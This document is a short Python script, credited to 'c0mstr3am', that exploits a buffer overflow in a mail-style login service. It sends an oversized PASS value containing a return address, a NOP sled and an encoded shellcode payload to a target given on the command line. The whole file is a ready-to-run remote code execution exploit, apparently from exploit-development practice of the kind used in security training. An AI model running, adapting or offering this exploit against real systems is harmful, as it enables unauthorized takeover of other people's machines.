#!/usr/bin/python
import socket
import sys
from time import sleep

counter=2700
host=str(sys.argv[1])
port=int(sys.argv[2])

print ("made by c0mstr3am")
if len(sys.argv)!=3:
	print("Usage: ./fuzzer.py IP PORT")
	sleep(1)
	exit(0)
else:
	pass

payload = (
"\xba\x24\x28\xd4\x0b\xd9\xc5\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x52\x83\xc6\x04\x31\x56\x0e\x03\x72\x26\x36\xfe\x86\xde\x34"
"\x01\x76\x1f\x59\x8b\x93\x2e\x59\xef\xd0\x01\x69\x7b\xb4\xad"
"\x02\x29\x2c\x25\x66\xe6\x43\x8e\xcd\xd0\x6a\x0f\x7d\x20\xed"
"\x93\x7c\x75\xcd\xaa\x4e\x88\x0c\xea\xb3\x61\x5c\xa3\xb8\xd4"
"\x70\xc0\xf5\xe4\xfb\x9a\x18\x6d\x18\x6a\x1a\x5c\x8f\xe0\x45"
"\x7e\x2e\x24\xfe\x37\x28\x29\x3b\x81\xc3\x99\xb7\x10\x05\xd0"
"\x38\xbe\x68\xdc\xca\xbe\xad\xdb\x34\xb5\xc7\x1f\xc8\xce\x1c"
"\x5d\x16\x5a\x86\xc5\xdd\xfc\x62\xf7\x32\x9a\xe1\xfb\xff\xe8"
"\xad\x1f\x01\x3c\xc6\x24\x8a\xc3\x08\xad\xc8\xe7\x8c\xf5\x8b"
"\x86\x95\x53\x7d\xb6\xc5\x3b\x22\x12\x8e\xd6\x37\x2f\xcd\xbe"
"\xf4\x02\xed\x3e\x93\x15\x9e\x0c\x3c\x8e\x08\x3d\xb5\x08\xcf"
"\x42\xec\xed\x5f\xbd\x0f\x0e\x76\x7a\x5b\x5e\xe0\xab\xe4\x35"
"\xf0\x54\x31\x99\xa0\xfa\xea\x5a\x10\xbb\x5a\x33\x7a\x34\x84"
"\x23\x85\x9e\xad\xce\x7c\x49\xd8\x05\x7e\xa8\xb4\x1b\x7e\xab"
"\xff\x95\x98\xc1\xef\xf3\x33\x7e\x89\x59\xcf\x1f\x56\x74\xaa"
"\x20\xdc\x7b\x4b\xee\x15\xf1\x5f\x87\xd5\x4c\x3d\x0e\xe9\x7a"
"\x29\xcc\x78\xe1\xa9\x9b\x60\xbe\xfe\xcc\x57\xb7\x6a\xe1\xce"
"\x61\x88\xf8\x97\x4a\x08\x27\x64\x54\x91\xaa\xd0\x72\x81\x72"
"\xd8\x3e\xf5\x2a\x8f\xe8\xa3\x8c\x79\x5b\x1d\x47\xd5\x35\xc9"
"\x1e\x15\x86\x8f\x1e\x70\x70\x6f\xae\x2d\xc5\x90\x1f\xba\xc1"
"\xe9\x7d\x5a\x2d\x20\xc6\x7a\xcc\xe0\x33\x13\x49\x61\xfe\x7e"
"\x6a\x5c\x3d\x87\xe9\x54\xbe\x7c\xf1\x1d\xbb\x39\xb5\xce\xb1"
"\x52\x50\xf0\x66\x52\x71" )

#5F4A358F
buffer = "A"*2606 + "\x8f\x35\x4a\x5f" + "\x90"*16 + payload + "C"*(3500-2606-4-351-16)

try:
	print "\nSending evil buffer with %s bytes" % len(buffer)
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host,port))
	data = s.recv(1024)
	s.send('USER test\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone! ;-)"
except:
        print "Could not connect to %s port" % port
